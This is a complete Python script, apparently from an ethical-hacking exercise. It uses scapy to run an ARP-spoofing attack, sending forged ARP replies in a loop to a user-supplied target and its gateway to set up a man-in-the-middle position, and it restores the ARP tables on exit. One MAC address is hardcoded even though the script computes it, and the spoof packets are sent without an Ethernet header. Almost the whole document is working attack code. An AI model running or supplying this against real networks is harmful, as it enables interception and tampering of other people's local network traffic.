#!/usr/bin/env python3

from scapy.layers.l2 import ARP, sendp, Ether, srp
import time

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast / arp_request
    answered_l = srp(arp_req_broad, timeout=1, verbose=False)[0]

    return answered_l[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst="08:00:27:a1:d5:22", psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=4, verbose= False)

target_ip = str(input("Type the target IP in the format X.X.X.X: "))
gateway_ip = str(input("Type the Gateway IP int he format: X.X.X.X: "))

# Examples:
# target_ip = "10.0.2.3"
# gateway_ip = "10.0.2.1"

try:
    sent_packets = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets = sent_packets + 2
        print("\rPackets sent: " + str(sent_packets), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("\rQuitting")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

